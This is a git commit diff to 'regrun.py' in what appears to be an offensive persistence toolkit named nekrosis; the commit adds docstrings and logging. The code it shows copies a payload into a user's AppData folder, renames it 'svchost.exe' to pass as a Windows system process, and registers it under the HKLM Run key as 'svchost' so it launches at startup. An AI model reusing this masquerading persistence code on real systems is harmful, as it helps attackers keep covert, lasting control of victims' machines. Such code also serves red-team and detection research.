a0ce422801f40348c6d5838a149d220b408b3bf5
Mykola Grymalyuk <khronokernel@icloud.com>
2024-02-24 15:49:07 -0700

    regrun.py: Add docstring and logging usage

--- nekrosis/support/windows_utilities/regrun.py
+++ nekrosis/support/windows_utilities/regrun.py
@@ -1,18 +1,29 @@
+"""
+regrun.py: Windows-specific persistence method for adding a run key to the Windows registry.
+"""
+
+import os
 import sys
+import shutil
+import logging
+
 if sys.platform == "win32":
     import winreg
 else:
     winreg = None
-import shutil
-import os
 
 
 class RUNKEY:
+
     def __init__(self, payload: str):
         self.payload      = payload
         self.current_user = os.getlogin()
 
-    def _add_run_key(self, file):
+
+    def _add_run_key(self, file: str):
+        """
+        Add a run key to the Windows registry.
+        """
         key_path   = r"Software\Microsoft\Windows\CurrentVersion\Run"
         value_name = "svchost"
 
@@ -20,11 +31,15 @@ class RUNKEY:
             with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_SET_VALUE) as key:
                 winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, file)
 
-            print("Run key added successfully.")
+            logging.info(f"Run key added successfully: {file}")
         except Exception as e:
-            print("Error: {}".format(e))
-    
-    def _copy_and_rename(self, source_path, destination_path, new_filename):
+            logging.error(f"Error adding run key: {e}")
+
+
+    def _copy_and_rename(self, source_path: str, destination_path: str, new_filename: str):
+        """
+        Copy and rename a file.
+        """
         try:
             os.makedirs(destination_path, exist_ok=True) # Make sure dst folder exists!
 
@@ -34,11 +49,14 @@ class RUNKEY:
 
             return new_file_path
         except Exception as e:
-            print(f"Error: {e}")
+            logging.error(f"Error copying and renaming file: {e}")
             return None
 
 
     def install(self):
+        """
+        Install payload.
+        """
         dst           = "C:\\Users\\" + self.current_user + "\\AppData\\Roaming\\WindowsExtensions\\"
         new_file_path = self._copy_and_rename(self.payload, dst, "svchost.exe")
 
